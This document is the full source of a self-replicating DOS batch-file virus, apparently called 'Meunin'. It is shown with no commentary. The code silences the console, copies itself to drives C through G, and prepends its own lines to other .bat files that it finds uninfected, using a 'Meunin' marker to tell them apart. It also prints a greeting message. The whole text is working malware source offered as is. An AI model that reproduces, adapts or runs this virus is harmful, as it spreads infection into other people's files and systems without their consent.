@echo Gud Meunin, from Meunin TM.
@ctty nul%Meunin%
if "%1=="Meunin1 goto Meunin1
if "%1=="Meunin2 goto Meunin2
for %%d in (c d e f g) do call %0 Meunin1 %%d
for %%b in (*.bat ..\*.bat) do call %0 Meunin2 %%b
goto Meunin4
:Meunin1
copy %0 %2:\%0%Meunin%
if not exist %2:\%0 goto Meunin3
for %%b in (%2:\*.bat) do call %0 Meunin2 %%b
@echo Gud Meunin, from Meunin TM.
goto Meunin3
:Meunin2
if %2==AUTOEXEC.BAT goto Meunin3
find "Meunin"<%2
if not errorlevel 1 goto Meunin3
@echo Gud Meunin, from Meunin TM.
find "Meunin"<%0>c:\Meunin.bat
type %2>>c:\Meunin.bat
copy c:\Meunin.bat %2
:Meunin3
exit %Meunin%
:Meunin4
@echo Gud Meunin, from Meunin TM.
del c:\Meunin.bat
ctty con%Meunin%
: Meunin (c) Meunin